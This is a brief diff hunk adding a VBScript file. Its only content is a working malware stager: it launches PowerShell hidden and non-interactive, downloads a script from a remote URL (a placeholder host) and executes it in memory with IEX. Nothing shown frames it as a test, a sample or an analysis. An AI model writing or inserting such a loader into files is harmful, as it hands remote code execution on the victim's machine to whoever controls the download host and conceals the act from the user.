@@ -1,0 +1,3 @@
+Set sh = CreateObject("WScript.Shell")
+sh.Run "powershell -nop -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')""", 0
+
